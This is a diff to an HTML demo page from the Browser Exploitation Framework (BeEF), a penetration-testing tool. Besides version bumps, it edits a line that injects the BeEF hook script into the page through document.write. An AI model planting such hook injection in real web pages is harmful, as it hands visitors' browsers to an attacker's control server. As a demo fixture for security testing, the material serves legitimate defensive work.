@@ -1,5 +1,5 @@
 <!--
-    Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+    Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
     Browser Exploitation Framework (BeEF) - http://beefproject.com
     See the file 'doc/COPYING' for copying permission
 -->
@@ -14,7 +14,7 @@
 	<link rel="stylesheet" type="text/css" href="butch.css" />
 </head>
 <body>
-<script src="jquery-1.5.min.js"></script>
+<script src="jquery-1.12.4.min.js"></script>
 <script>
 
 	function showfriends() {
@@ -29,7 +29,7 @@
 
 </script>
 <script>
-	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '<%= @hook_uri %>" type="text/javascript"><\/script>';
+	var commandModuleStr = '<script src="<%= @hook_uri %>" type="text/javascript"><\/script>';
 	document.write(commandModuleStr);
 </script>
 <div id="content">
